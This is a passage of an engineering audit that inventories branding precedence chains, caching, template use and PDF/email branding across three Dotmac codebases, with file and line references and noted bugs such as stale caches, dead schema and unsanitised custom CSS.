# F0 — Existing branding & settings inventory (starter / ERP / Sub)

Read-only characterization, 2026-08-02. Input to deciding a single
brand-precedence chain and a single settings facility for the Dotmac
white-label foundation.

Repos under analysis:

- **starter** — `/Users/michaelayoade/Downloads/management/dotmac_starter_mt`
  (reference assembly `app/` + kernel package
  `packages/dotmac-kernel/src/dotmac_kernel/`)
- **ERP** — `/Users/michaelayoade/Downloads/management/dotmac_erp`
- **Sub** — `/Users/michaelayoade/Downloads/management/dotmac_sub`

All paths below are absolute-from-repo-root within the repo named in the
section heading.

---

# 1. Branding mechanisms, per repo

## 1.1 starter (`dotmac_starter_mt`)

Two deliberately separated layers, both owned by
`packages/dotmac-kernel/src/dotmac_kernel/branding.py`.

### Layer A — deployment-static `get_brand()`

Sources, **lowest to highest precedence** (branding.py:153-169):

1. built-in `_DEFAULTS` dict — branding.py:98-105
2. `brand.json`, read from **`Path.cwd() / "brand.json"`** (branding.py:129-139),
   overridable by `BRAND_CONFIG_PATH` env var (branding.py:130)
3. the same-named `BRAND_*` **process environment variable** — branding.py:163

The precedence loop verbatim (branding.py:161-168):

```python
for friendly, json_key in _KEY_MAP.items():
    # env var wins, then brand.json, then the existing default
    value = os.getenv(json_key)
    if not (isinstance(value, str) and value.strip()):
        file_value = raw.get(json_key)
        value = file_value if isinstance(file_value, str) else None
    if isinstance(value, str) and value.strip():
        brand[friendly] = value.strip()
```

`_KEY_MAP` (branding.py:85-92) — exactly **six** fields: `name`→`BRAND_NAME`,
`tagline`→`BRAND_TAGLINE`, `primary_color`→`BRAND_PRIMARY_COLOR`,
`accent_color`→`BRAND_ACCENT_COLOR`, `support_email`→`BRAND_SUPPORT_EMAIL`,
`app_url`→`BRAND_APP_URL`.

Repo-root `brand.json` carries the same six keys plus a `_comment`.
`.env.example:105-116` documents `BRAND_CONFIG_PATH` + the six `BRAND_*` knobs
and explicitly notes they are read via `os.getenv`, **not** through the
pydantic `Settings` class.

**Caching:** `@lru_cache(maxsize=1)` on `get_brand()` (branding.py:153) —
process-lifetime; `reset_brand_cache()` (branding.py:172-174) is test-only. The
resolved dict is also frozen into a Jinja global once at module import:
`templating.py:212` `templates.env.globals["brand"] = get_brand()`.

### Layer B — per-tenant DB override `load_branding(db, tenant_id)`

branding.py:213-246. Starts from `dict(get_brand())` and overlays the tenant's
`ui_branding` JSON setting resolved through the ordinary settings resolver:

```python
override = resolve_value(
    db, SettingDomain.branding, "ui_branding", tenant_id=tenant_id, default={}
)
```

Merge rules:

- allowlisted to `_KNOWN_BRAND_KEYS` (branding.py:114-116) =
  `{name, tagline, logo_url, primary_color, accent_color, custom_css}`; any
  other key in the stored dict is silently dropped (branding.py:231-233).
- `primary_color` / `accent_color` normalized to `#RRGGBB` via `_normalize_hex`
  (branding.py:177-183); a bad value falls back to the static colour.
- `custom_css` passed through `sanitize_branding_css` (branding.py:196-210).

**Caching:** none at this layer — `load_branding` hits the DB every call. The
per-request memo is `get_request_branding` (branding.py:249-267), storing the
result on `request.state.branding`.

### Actual full precedence chain implemented today

```
built-in _DEFAULTS
  < brand.json  (cwd, or BRAND_CONFIG_PATH)
  < BRAND_* process env
      [ ^ all three collapsed once per process by lru_cache into get_brand() ]
  < tenant `domain_settings` row  (domain=branding, key=ui_branding)
      resolved by resolve_value → tenant row < platform (tenant_id IS NULL) row
      < SettingSpec default ({})
  < an explicit `brand` key in a route's own render context
```

The last step is `templating.render()` (templating.py:240-242,
`ctx.setdefault("brand", branding)`); documented in templating.py:29-39 as
"explicit route context > per-request tenant override > static global". The
only route exercising it is the branding editor's live preview
(`app/features/settings/web.py:250-262`).

### Where a template reads it

- Process-static Jinja global installed at `templating.py:212`.
- Per-request tenant branding injected in `render()` at `templating.py:240-242`
  from `request.state.branding`.
- Warmed at exactly **three** call sites (branding.py:36-59):
  `dotmac_kernel.web_deps.require_web_auth`, plus `GET` and `POST /admin/login`
  in `app/features/auth/web.py`.
- Template consumers:
  - `packages/dotmac-kernel/src/dotmac_kernel/templates/base.html:7` — `brand.name`
  - `.../templates/layouts/admin.html:20` — `brand.name`
  - `.../templates/components/sidebar.html:29,31` — `brand.mark`, `brand.name`
  - `.../templates/auth/login.html:23,31,33` — `brand.name`, `brand.mark`
  - `.../templates/admin/settings/branding.html:34-68` — the editor page

### starter branding gaps

- **`brand.mark` is read but never produced.** `sidebar.html:29` and
  `login.html:31` render `brand.mark`; `mark` is in neither `_KEY_MAP`,
  `_DEFAULTS`, nor `_KNOWN_BRAND_KEYS`. Every deployment shows the hardcoded
  fallback `"A"`. (Both ERP implementations that DO derive a mark are described
  in §1.2.)
- **`logo_url` is editable but never rendered.** In `_KNOWN_BRAND_KEYS`
  (branding.py:115) and in the editor form (`app/features/settings/web.py:244,296`;
  `templates/admin/settings/branding.html:36`), but no template outputs it.
- **`support_email` and `app_url` have no readers at all** — only `_KEY_MAP`,
  `_DEFAULTS`, `brand.json`, `.env.example`, and the test fake
  (`packages/dotmac-kernel/src/dotmac_kernel/testing/fakes.py:65-66`).
- **No favicon anywhere.** No `<link rel="icon">` in any kernel template; no
  favicon asset under `packages/dotmac-kernel/src/dotmac_kernel/static/`.
- **Colours are baked at build time, not applied at runtime.** The real UI
  palette lives in the Tailwind v4 `@theme` block at
  `packages/dotmac-kernel/src/dotmac_kernel/static/css/src/main.css:20-52`
  (`--color-primary-*`, `--color-accent-*`), compiled into `static/css/main.css`.
  `brand.primary_color`/`brand.accent_color` reach the page in exactly two
  places — the swatch `style=` attributes on the editor preview
  (`templates/admin/settings/branding.html:49-50`). **A tenant colour override
  is cosmetically inert outside that one card.**
- **`ProductAssemblySpec.branding` is declared but unconsumed.**
  `packages/dotmac-kernel/src/dotmac_kernel/assembly.py:50-52` declares
  `branding: object | None` "(a BrandSpec or None)"; there is **no `BrandSpec`
  type in the repo**, and `create_app` never reads `spec.branding` (the only
  `spec.` reads in `app_factory.py` are `modules`, `disabled_modules`,
  `web_enabled`, `assembly_template_dir`, `assembly_static_dir`, `name` —
  lines 94-180). Same for `spec.settings_overrides` and `spec.providers`.
- **Two competing "tenant name" fields.** `Tenant.name`
  (`packages/dotmac-kernel/src/dotmac_kernel/models.py:91`) and
  `ui_branding.name`. Nothing reconciles them.
- **`.env` does not reach branding.** `Settings` uses
  `SettingsConfigDict(env_file=".env", ...)` (`config.py:12`), but branding reads
  `os.getenv` directly (branding.py:130,163) and pydantic-settings does not
  export the `.env` file into `os.environ`. `BRAND_NAME` in `.env` works only
  because `docker-compose.yml:15` uses `env_file: .env`. Running `make dev`
  locally with a `.env`, the `BRAND_*` values are silently ignored.

**Document / email branding in the starter: none.** No PDF/invoice generation,
no email sender configuration, no document footer.

## 1.2 ERP (`dotmac_erp`)

Four sources; **no `brand.json` / no file layer at all** (`find . -name
"brand*.json"` → only mypy cache artifacts).

### Source 1 — env → frozen dataclass `Settings`

`app/config.py` — `@dataclass(frozen=True)` at :33, `settings = Settings()` at
:373. Defaults are `os.getenv(...)` evaluated **at import time**, so env is
baked in at process start.

| line | field | env var | default |
| --- | --- | --- | --- |
| 68 | `app_version` | `APP_VERSION` | `"1.23.2"` |
| 69 | `brand_name` | `BRAND_NAME` | `"Dotmac ERP"` |
| 70-73 | `brand_tagline` | `BRAND_TAGLINE` | `"Unified ERP for finance, HR, and operations"` |
| 74 | `brand_logo_url` | `BRAND_LOGO_URL` | `None` |
| 75 | `brand_mark` | `BRAND_MARK` | `None` (auto-derived) |
| 57 | `branding_upload_dir` | `BRANDING_UPLOAD_DIR` | `static/branding` |
| 58-60 | `branding_max_size_bytes` | `BRANDING_MAX_SIZE_BYTES` | 5 MB |
| 61-64 | `branding_allowed_types` | `BRANDING_ALLOWED_TYPES` | jpeg,png,gif,webp,svg+xml,x-icon,vnd.microsoft.icon |
| 65 | `branding_url_prefix` | `BRANDING_URL_PREFIX` | `/static/branding` |
| 88-95 | `default_functional_currency_code` / `default_presentation_currency_code` | `DEFAULT_*_CURRENCY_CODE` | ← `DEFAULT_CURRENCY_CODE` |
| 10-30 | `DEFAULT_CURRENCY_CODE` | derived from host `locale.LC_MONETARY`/`LC_ALL`/`LC_CTYPE`/`LANG` | `NGN` |
| 98-108 | landing copy | `LANDING_HERO_BADGE`, `LANDING_HERO_TITLE`, `LANDING_HERO_SUBTITLE`, `LANDING_CTA_PRIMARY`, `LANDING_CTA_SECONDARY`, `LANDING_CONTENT_JSON` | — |

Declared in `.env.example:129-137`; templated by
`scripts/bootstrap_instance.py:222-228` (writes `BRAND_NAME={org_name}`).
PDF asset base URL: `PDF_ASSET_BASE_URL` → `APP_URL` → `http://app:8002`
(`app/services/people/payroll/payslip_pdf.py:227-229`,
`app/services/finance/rpt/pdf.py:138-140`).

### Source 2 — `core_org.organization_branding` (per-tenant, 1:1 with Organization)

Model `app/models/finance/core_org/organization_branding.py`; migrations
`alembic/versions/add_organization_branding.py`,
`.../fix_org_branding_created_by_fk.py`,
`.../20260130_add_payslip_branding_options.py`.

| line | column | notes |
| --- | --- | --- |
| 63-68 | `branding_id` | UUID PK |
| 70-75 | `organization_id` | UUID FK unique, CASCADE |
| 80-84 | `display_name` | String(255) |
| 85-89 | `tagline` | String(500) |
| 90-94 | `logo_url` | light backgrounds |
| 95-99 | `logo_dark_url` | |
| 100-104 | `favicon_url` | |
| 105-109 | `brand_mark` | String(4) |
| 114-128 | `primary_color` / `primary_light` / `primary_dark` | String(7) `#RRGGBB` |
| 133-147 | `accent_color` / `accent_light` / `accent_dark` | |
| 152-166 | `success_color` / `warning_color` / `danger_color` | |
| 171-185 | `font_family_display` / `font_family_body` / `font_family_mono` | Google Fonts names |
| 190-200 | `border_radius` | enum `core_org.border_radius_style` sharp/rounded/pill, default ROUNDED |
| 201-211 | `button_style` | enum solid/gradient/outline, default GRADIENT |
| 212-222 | `sidebar_style` | enum dark/light/brand, default DARK |
| 227-231 | `custom_css` | Text — "injected after generated styles" |
| 236-256 | `is_active`, `created_at`, `updated_at`, `created_by_id` | |

Enums at organization_branding.py:23-44; Pydantic mirror
`app/schemas/finance/branding.py:15-36`.

**Orphaned payslip branding columns (DB-only, zero code references).**
`alembic/versions/20260130_add_payslip_branding_options.py:23-92` adds
`payslip_template` (CHECK default/compact/detailed), **`payslip_footer_text`**,
`payslip_show_ytd`, `payslip_show_tax_breakdown`, `payslip_show_bank_details`,
**`payslip_confidentiality_notice`**. `grep -rn "payslip_footer_text|
payslip_template|payslip_show" app templates` → zero hits. These are the only
"document footer text" and "confidentiality notice" brand fields in any of the
three repos, and they are dead schema.

### Source 3 — the `Organization` row (legal/contact/locale)

`app/models/finance/core_org/organization.py`: `slug` (79-85, public/careers
portal identifier), `legal_name` (88, NOT NULL), `trading_name` (89),
`registration_number` (90), `tax_identification_number` (91-94),
`incorporation_date` (95), `jurisdiction_country_code` (96-99),
`functional_currency_code` (102), `presentation_currency_code` (103),
`fiscal_year_end_month/day` (106-107), `timezone` (172), `date_format` (173),
`number_format` (174), `contact_email` (177), `contact_phone` (178),
`address_line1/2`, `city`, `state`, `postal_code`, `country` (181-186),
`logo_url` (189), `website_url` (190).

There is **no** `Organization.address`, `.phone`, `.email` or `.name` property.

### Source 4 — domain settings (`email` / `reporting` domains)

- `email_logo_url` — read `app/services/admin/settings_web.py:273-275`
- `report_logo_url` — read `:276-278`, written `:411,427-431`
- `include_logo_in_reports` (bool, default True) — spec `app/services/settings_spec.py:429-434`, seeded `settings_seed.py:428`
- `report_watermark_text` — spec `:436-441`
- `report_orientation` (PORTRAIT/LANDSCAPE) — spec `:421-428`
- `smtp_from_email` / `smtp_from_name` / `email_reply_to` — spec `:259,266,273`

### Hardcoded brand constants (ERP)

- `CSSGenerator.DEFAULTS` — `app/services/finance/branding.py:145-159`
  (`primary #0D9488`, `accent #D97706`, `success #10B981`, `warning #F59E0B`,
  `danger #EF4444`, fonts `DM Sans`/`JetBrains Mono`, radius `8px`).
  **Dead code — never referenced.**
- `BORDER_RADIUS_MAP` `:161-165`; `FONT_PRESETS` (14 Google fonts) `:563-648`
- `_DEFAULT_PRIMARY = "#0d9488"`, `_DEFAULT_ACCENT = "#d97706"` —
  `app/services/email_branding.py:24-25`
- CSS custom-property defaults — `static/css/app.css:14,26-31,105-108`
  (`--gold`, `--teal`, `--brand-primary: var(--teal)`), helpers `:1144-1152`
- Tailwind palette — `tailwind.config.js:71-72`
- Fallback marks: `"DB"` (`app/web/deps.py:118,128,233`), `"DM"`
  (`templates/partials/_brand_context.html:10`), `"Dotmac"`
  (`templates/module_select.html:16`, `module_select_gov.html:16`)

### Actual precedence order implemented (ERP)

**Layer A — `brand_context()`** (`app/web/deps.py:124-135`) — env defaults only;
`mark` auto-derived by `_brand_mark()` (`:110-121`, whitespace split).

**Layer B — `org_brand_context()`** (`app/web/deps.py:138-209`), merge at
`:197-209`:

```python
return {
    "name": branding.display_name or base["name"],
    "tagline": branding.tagline or base["tagline"],
    "logo_url": branding.logo_url or base["logo_url"],
    "logo_dark_url": branding.logo_dark_url,
    "favicon_url": branding.favicon_url,
    "mark": branding.brand_mark or base["mark"],
    "css": css, "fonts_url": fonts_url,
    "has_custom_branding": True,
    "primary_color": branding.primary_color,
    "accent_color": branding.accent_color,
}
```

`logo_dark_url` / `favicon_url` / `primary_color` / `accent_color` have **no env
fallback** — DB or nothing.

**Layer C — `resolve_brand_context()`** (`app/web/deps.py:212-234`):

```python
brand = (org_brand_context(db, organization_id)
         if db and organization_id else brand_context())
if organization:
    org_name = organization.trading_name or organization.legal_name
    if org_name and (not brand.get("name") or brand.get("name") == settings.brand_name):
        brand["name"] = org_name
    if organization.logo_url and not brand.get("logo_url"):
        brand["logo_url"] = organization.logo_url
    if not brand.get("mark"):
        brand["mark"] = _brand_mark(brand.get("name") or org_name or "DB")
```

Effective order: `env defaults` < `Organization.trading_name/legal_name/logo_url`
< `OrganizationBranding.*`.

**The name rule is a sentinel comparison** (`:226-228`): the org name wins when
the resolved name is falsy *or exactly equals `settings.brand_name`*. A tenant
that deliberately sets `display_name` to the platform default string is
indistinguishable from "unset" and gets silently overwritten.

**Variant chains ERP also runs:**

- Admin shell dual-org resolution — `app/services/admin/web/common.py:325-351`:
  resolves for `auth.organization_id`, then if `request.state.organization_id`
  differs, re-resolves and **swaps the whole dict** when the primary lacks logo
  *or* favicon.
- Login pages (unauthenticated) — `app/services/auth_web.py:129-166`:
  `?org=<slug>` → `Organization.slug` lookup; else if exactly one Organization
  exists, auto-detect it; else `brand_context()`. Hardcoded `brand_context()`
  (no org) at `:362,389,409`.
- Email/report PDFs — `app/services/email_branding.py:28-72`: `brand_name =
  org.trading_name or org.legal_name` (:59), colours from `branding` (:67-68).
  **This path ignores `OrganizationBranding.display_name` and
  `settings.brand_name` entirely**, so emails and report PDFs show a different
  brand name from the web UI.
- Payslip PDF — `app/services/people/payroll/payslip_pdf.py:88-131`: its own
  chain, caller args > `branding.display_name` > `trading_name` > `legal_name`;
  its own colour defaults `#0d9488`/**`#14b8a6`** (accent differs from the
  `#d97706` used everywhere else).
- Report PDF — `app/services/finance/rpt/pdf.py:92-130`, then `merged =
  {**org_context, **context}` (:130) — **report data wins over branding**.
- Email sender identity — `app/services/email.py:272-285`: `DB > env >
  hardcoded` (`"noreply@example.com"`, `"Dotmac ERP"`) — the **inverse** of the
  brand-name chain, which is env-as-base.

### Caching (ERP)

| where | mechanism |
| --- | --- |
| `app/services/cache.py:92` | `TTL_BRANDING = 3600` (1 h) |
| `app/services/cache.py:336-337` | key `org:{org_id}:branding:css`, prefixed `dotmac:` (:117-119) |
| `app/web/deps.py:176-195` | read-through cache of **generated CSS + fonts URL only** — name/logo/colour fields re-query per request |
| `app/services/cache.py:30-60` | module-global `_REDIS_CLIENT`; `None` (caching off, no error) when `REDIS_URL` unset |
| `app/services/finance/branding.py:516-524` | `_invalidate_branding_cache()`, best-effort, bare `except Exception`; called from `create()`/`update()`/`delete()` (:458,501,513) |
| `app/services/admin/settings_web.py:342-408` | **⚠ does NOT invalidate** — the admin UI POST (`app/web/admin.py:1132`) `setattr`s the model directly → up to 1 h of stale CSS |
| `app/services/settings_cache.py:33-71,450` | two-tier Redis + in-memory, `DEFAULT_TTL=300`, backs `email_logo_url`/`report_logo_url` |
| `app/services/careers/web.py:157-159` | **no cache** — careers portal regenerates CSS on every render |

No `lru_cache`, no `request.state` brand storage.

### How ERP templates read brand

**Explicit context vars only — there is no Jinja global and no context
processor.** `app/templates.py:23` creates the shared `Jinja2Templates`;
globals at `:26-29` are `now`, `t`, `_`, `app_version`.

`brand` / `org_branding` enter the context at ~30 call sites:
`app/web/deps.py:718,600-603,845-846`; `app/services/admin/web/common.py:400`;
`app/services/auth_web.py:194,226,362,389,409`;
`app/web_home.py:28,34-35,46-47,72,77-78`; `app/web/careers.py:178,222`;
`app/web/onboarding_portal.py:122-128,149-150` (plus raw
`brand_name: settings.brand_name` at `:201,256,305,356,373`);
`app/services/admin/dotmac_sub_sync_web.py:54-63`;
`app/services/admin/crm_sync_web.py:55-64`.

Normalisation partial `templates/partials/_brand_context.html:5-12` sets
`brand_data, brand_name, brand_tagline, brand_logo_url, brand_logo_dark_url,
brand_mark, report_logo_url, document_logo_url`; included at line 9-10 of 11
base layouts (finance, people, inventory, procurement, expense, coach,
public_sector, modules, help, fixed_assets, `_document_header.html:2`).

Root layout `templates/base.html` **re-derives the same variables at :26-30
instead of including the partial**; `<title>` :33; favicon chain :37-50
(`org_branding.favicon_url` → `brand_data.favicon_url` → `/static/favicon.svg`,
with MIME sniffing by extension); logo/mark/name/tagline :138-156.

### ERP PDF / document branding

- Payslip (WeasyPrint) — `app/services/people/payroll/payslip_pdf.py`; asset
  base URL `:220-229`; `_resolve_logo_url` `:231-241`;
  `_extract_branding_s3_key` `:243-268`; `_try_embed_branding_logo` `:270-300`
  with a **cross-tenant guard** at `:283-287` (S3 key's org segment must match).
  Template `templates/people/payroll/payslip_pdf.html:40,48,59,82,233,369-370`.
- Finance report PDFs — `app/services/finance/rpt/pdf.py:68-141`; base
  `templates/finance/reports/_pdf_base.html:30,39-70,225-229`; ~20 report
  templates extend it.
- Purchase order PDF — `app/services/finance/ap/purchase_order_pdf.py:94-129`;
  `templates/finance/ap/purchase_order_pdf.html:18,22-41,129-131`.
- Invoice print CSS — `app/services/finance/ar/web/invoice_web.py:61-82`
  `_resolve_print_logo_url()`; `templates/finance/ar/invoice_detail.html:169-200`.
- Shared header partial `templates/partials/_document_header.html:1-38`,
  included by 21+ report/detail templates.
- Automation document generator —
  `app/services/automation/document_generator.py:209-213,249-268`; per-template
  `header_config` / `footer_config` JSONB, page size/orientation/margins,
  `email_subject`, `email_from_name`, `styles` —
  `app/models/finance/automation/document_template.py:128-182`.
- Asset serving — `app/api/files.py:240-254` `GET /files/branding/{org_id}/
  {filename}` **public, no auth**; legacy alias `:289-295`; careers variant
  `app/web/careers.py:228-239`; upload/delete `app/services/branding_assets.py:19-66`;
  S3 config `app/services/file_upload.py:447-452,624-626`.
- Static favicon fallback `app/main.py:890-898`.

### ERP email branding

- Renderer `app/services/email_branding.py:75-107` — merge order at `:91-92` is
  `{**branding, **context}`, i.e. **caller context wins over branding**.
- Base templates `templates/emails/base_email.html` (border :27, logo :28-29,
  wordmark fallback :31, footer :48, support link :50-54) and
  `base_email.txt`.
- Sender identity `app/services/email.py:252-304` (DB > env > default),
  `From:` at `:436`, Reply-To `:440-442`, envelope sender `:475`; per-module
  override `_get_module_smtp_config` `:307+`; profiles
  `app/models/email_profile.py:133-141,202-219` with hardcoded fallback
  `from_name or "Dotmac ERP"` (`:214`).
- **`email_logo_url` is write-only**: written from the branding form
  (`app/web/admin.py:1127` → `app/services/admin/settings_web.py:416-424`),
  read back into the form (`:273-275,325`), but never consumed by the email
  renderer, which uses `branding.logo_url or org.logo_url`.

### ERP drift found while reading

1. **`org_branding.report_logo_url` never exists** — `org_brand_context()`
   returns no such key, yet `templates/partials/_brand_context.html:11` and
   `templates/finance/ar/invoice_detail.html:171` read it. The `report_logo_url`
   domain setting is therefore write-only.
2. **`organization.address` / `.phone` / `.email` / `.name` don't exist** —
   used at `templates/partials/_document_header.html:3-6` and
   `templates/finance/ar/invoice_detail.html:172-174`. Every branded document
   header renders a blank address/phone/email.
3. Admin branding save skips cache invalidation (above).
4. Six `payslip_*` columns orphaned (above).
5. `CSSGenerator.DEFAULTS` is dead code.
6. **Two divergent brand-mark algorithms**: `app/web/deps.py:110-121`
   (whitespace split) vs `app/services/finance/branding.py:107-128` (CamelCase
   regex). `"DotMac ERP"` → `"DE"` from one, `"DM"` from the other.
7. Accent-colour default inconsistent: `#d97706` (`email_branding.py:25`,
   `rpt/pdf.py:103`, `purchase_order_pdf.py:129`) vs `#14b8a6`
   (`payslip_pdf.py:90`).
8. `custom_css` has no sanitization at any layer and reaches `| safe` on a
   **public unauthenticated** page (`templates/careers/base_careers.html:40`).
9. `GET /branding/org/{org_id}/css` and `/fonts-url` are unauthenticated with
   `get_db_admin_bypass` (`app/api/settings.py:716-748`) — any caller with an
   org UUID reads another tenant's palette, fonts, and full `custom_css`.
10. `resolve_brand_context` sentinel bug (above).

## 1.3 Sub (`dotmac_sub`)

**Two independent brand systems meeting at a fallback boundary.**

### System A — deployment-static `get_brand()`

`app/services/branding_config.py` (112 lines). Docstring :8-13 states
`built-in defaults < brand.json < environment variable (same JSON key)`; the
implementation at `:94-107` matches (identical algorithm to the starter's,
which is a trimmed port of it). Only `str` JSON values are honoured (`:104`),
values are `.strip()`ed (`:106`), blank env vars ignored (`:102`).

Path resolution `_config_path()` `:76-80` — `BRAND_CONFIG_PATH` else
**`Path(__file__).resolve().parents[2] / "brand.json"`** (repo root, *not* cwd).
`_load_file()` `:83-91` never raises: `FileNotFoundError` → INFO + `{}`;
`OSError`/`ValueError` → WARNING + `{}`.

`_KEY_MAP` `:35-52` — **16** fields: `name`, `product_name`, `legal_name`,
`tagline`, `primary_color`, `secondary_color`, `semantic_positive_color`,
`semantic_info_color`, `semantic_warning_color`, `semantic_negative_color`,
`semantic_neutral_color`, `support_email`, `from_email`, `from_name`, `app_url`,
`payment_scheme`.

`_DEFAULTS` `:56-72` — the **actual DotMac production identity**: `"DotMac"`,
`"DotMac Subs"`, `"Dotmac Technologies"`, `support@dotmac.ng`,
`noreply@dotmac.ng`, `https://selfcare.dotmac.io`, `"dotmacpay"`.

**Caching:** `@lru_cache(maxsize=1)` `:94`; `reset_brand_cache()` `:110-112`
**has no callers anywhere in the repo**. Second-order: the dict is copied into
Jinja globals once at startup (`app/web/brand_globals.py:156`
`templates.env.globals.setdefault("brand", get_brand())`), so even clearing the
lru_cache would not refresh templates.

**`brand.json` (repo root)** — 22 keys. The 16 above plus:
`BRAND_MOBILE_APP_NAME` (:18), `API_BASE_URL` (:20), `GLITCHTIP_DSN` (:21),
`GLITCHTIP_ENVIRONMENT` (:22) — **mobile-only, absent from `_KEY_MAP`**. The
`_comment` (:2) declares the file is shared with
`flutter build --dart-define-from-file=../brand.json` and that native app
identity is deliberately not set here. Copies exist in four
`.claude/worktrees/*/brand.json`.

**`.env.example` documents none of the `BRAND_*` env inputs** (case-insensitive
grep over `.env.example`, `docker-compose*.yml`, `Dockerfile`, `Makefile` → zero
hits).

### System B — `brand_profiles` table (the Branding SOT)

Model `app/models/branding.py`, `class BrandProfile` :22, `__tablename__ =
"brand_profiles"` :25. Scope CHECK :27-31 (`platform` ⇒ `scope_id IS NULL`;
`reseller`/`organization` ⇒ NOT NULL); partial unique indexes :32-46.

Columns :52-81 — `scope_type`, `scope_id`, `brand_name`, `product_name`,
`legal_name`, `tagline`, `primary_color` (String(7)), `secondary_color`,
`logo_url`, `dark_logo_url`, `favicon_url`, `support_email`, `support_phone`,
`from_email`, `from_name`, `app_url`, `portal_domain`, `legal_address` (JSON),
`metadata_`→column `metadata` (JSON, holds `semantic_colors`), `is_active`,
`created_at`, `updated_at`.

Migration `alembic/versions/267_brand_profiles.py` (`revision =
"267_brand_profiles"` :14; docstring :3 still says `262_brand_profiles` —
stale, as do `docs/CONTROL_RELATIONSHIPS_AND_BRANDING_SOT.md:52,76`).

Schemas `app/schemas/branding.py:9-61`. API `app/api/branding.py` — `GET
/branding/resolve` :15-27, `GET /branding/profiles` :30-38, `PUT
/branding/profiles/{scope_type}` :41-55, `DELETE` :58-72; plus `GET
/api/v1/me/branding` (`app/api/me.py:205-212`).

### Layer between them — `_legacy_brand()`

`app/services/brand_profiles.py:88-140`. Merges the static brand
(`get_deployment_brand()` :95) with `get_company_info(db)` (:96, billing-domain
`domain_settings`) and `comms`-domain settings (:98-118):
`brand_primary_color`, `brand_secondary_color`, five `brand_semantic_*_color`,
`sidebar_logo_url`, `sidebar_logo_dark_url`, `favicon_url`. Legal address built
from `company_address_{street1,street2,city,zip,country}` (:129-135);
`source_scope="legacy"` (:136). Cached on `db.info[_LEGACY_CACHE_KEY]` (:26,
:89, :139) — **per DB Session**.

### Actual precedence order implemented (Sub)

`resolve_brand()` `app/services/brand_profiles.py:187-219`, docstring
`"""Resolve organization -> reseller -> platform -> legacy branding."""`,
applied lowest-to-highest:

```
_legacy_brand(db)
    = built-in defaults < brand.json < BRAND_* env      (branding_config.get_brand)
      < billing-domain company info                     (web_system_company_info)
      < comms-domain settings                           (settings_spec.resolve_value)
  < BrandProfile(scope_type='platform',     scope_id=NULL)
  < BrandProfile(scope_type='reseller',     scope_id=<reseller_id>)
  < BrandProfile(scope_type='organization', scope_id=<organization_id>)
```

A `subscriber_id` argument is resolved to its `reseller_id`/`organization_id`
first (:196-200), so branding follows the subscriber's reseller/org — the
reseller/OEM white-label path. `_apply_profile` (:167-185) is **field-level**:
it only overwrites when `value not in (None, "")` (:170), so blank columns
inherit. `BRAND_SCOPE_PRECEDENCE = ("organization","reseller","platform")` :23.

Result is a frozen `ResolvedBrand` dataclass (:37-60) carrying
**`source_scope` / `source_scope_id` provenance** — the only brand-resolution
provenance in any of the three repos.

`docs/CONTROL_RELATIONSHIPS_AND_BRANDING_SOT.md:36-84` documents this as the
5-level Branding Ownership order.

### Write-path validation (Sub) — the strongest of the three

`upsert_brand_profile` :222-286:

- scope validity :230-243 (reseller/organization existence)
- hex validation :252-254 (`_HEX_COLOR = re.compile(r"^#[0-9a-fA-F]{6}$")` :24)
- `metadata_.semantic_colors` — known tone + 6-digit hex + **WCAG-AA contrast**
  (:255-272 via `is_accessible_semantic_color`)
- **asset URL allowlist** :273-278 — `_ASSET_URL_FIELDS =
  {"logo_url","dark_logo_url","favicon_url"}` (:25) must start with `https://`,
  `http://`, `/static/`, or `/branding/assets/`
- `app_url` must be absolute HTTP(S) :279-281
- `is_active = True` on every upsert (:283) — reactivation, not duplication

Admin write path mirrors it: `app/web/admin/system.py:3470-3739` —
`_validate_url` :3509-3525 (same allowlist), colour regex :3669/:3682, semantic
contrast gate :3703-3712 (400 on failure), then propagation to the SOT via
`sync_platform_brand_from_legacy_settings_committed(...,
overwrite_fields={"logo_url","dark_logo_url","favicon_url","primary_color",
"secondary_color","semantic_colors"})` :3714-3729.

### Sub colour engine and runtime theme

`app/services/brand_theme.py` — `DEFAULT_HEX = "#206a07"` :11,
`DEFAULT_SECONDARY_HEX = "#06b6d4"` :12, `SEMANTIC_TONES` :13,
`DEFAULT_SEMANTIC_COLORS` :14-20, `COLOR_SCALE_STEPS` :21,
`LEGACY_TAILWIND_PALETTE_ROLES` :27-45, `CATEGORICAL_COLOR_ROLES` :49-57
(`--color-data-1..7`), `MIN_SEMANTIC_TEXT_CONTRAST = 4.5` :58,
`generate_scale` :112-124, `contrast_ratio` :137-142,
`is_accessible_semantic_color` :154-161.

`app/web/public/branding.py`:
- `_theme_css()` :39-78 emits `--color-primary-*`, `--color-brand-*`,
  `--color-accent-*`, `--color-semantic-{tone}-*`, legacy Tailwind aliases via
  `var()`, `--color-data-N`.
- `GET /branding/theme.css` :81-127 — `resolve_brand(db)` :94, contrast gate
  :110-115, total try/except fallback to defaults, `Cache-Control: public,
  max-age=300` :126.
- `GET /branding/login-hero/{portal}` :130-147 — comms setting
  `login_hero_{portal}_url`, fallback `/static/illustrations/login-hero-
  {portal}.webp`, 307 redirect. Portals: customer, reseller, admin (:36).
- `GET /branding/manifest.webmanifest` :150-186 — PWA manifest from
  `resolve_brand(db)`: `name = f"{resolved.name} Selfcare"` :158, `short_name`
  :159, `theme_color = resolved.primary_color` :163, icons from
  `/static/branding/favicon/{icon-192,icon-512,apple-touch-icon}.png` :164-180,
  hardcoded description :160, `start_url "/portal/"` :161, `background_color
  "#ffffff"` :162.
- `GET /branding/assets/{file_id}` :189-216 — streams `StoredFile` where
  `entity_type == "branding_asset"`; missing favicon 307 → `/favicon.ico`;
  `Cache-Control: public, max-age=3600`.

Asset storage `app/services/branding_storage.py` — `BRANDING_URL_PREFIX =
"/branding/assets/"` :15, `upload_branding_asset` :38-60 (soft-deletes the
previous asset per `setting_key`), `delete_managed_branding_url` :63-73.
Favicon guard `app/services/public_branding.py:13-31` checks both the legacy
comms setting and `BrandProfile.favicon_url`. Bundled assets under
`static/branding/favicon/`.

Build-time Tailwind palette (not brand-driven): `tailwind.config.js:64-93`,
safelist :4-14.

### How Sub templates read brand

- **Static Jinja global (System A)** — `app/web/brand_globals.py`:
  `install_brand_jinja_global()` :187-205 **monkey-patches
  `Jinja2Templates.__init__`** (:202) and back-fills already-created instances
  (:167-184,205). `templates.env.globals.setdefault("brand", get_brand())`
  :156. Also `current_year` :157, `app_version` :158, `chat_live_enabled` :159,
  `currency_symbol` :160, filters `money`/`app_datetime`/`portal_date`/
  `portal_datetime` :161-164. Called from `app/main.py:49,51`. Docstring
  :10-12 mandates the guard pattern `brand.primary_color if brand is defined
  and brand else "#3b82f6"`.
- **Customer portal context processor (System B)** —
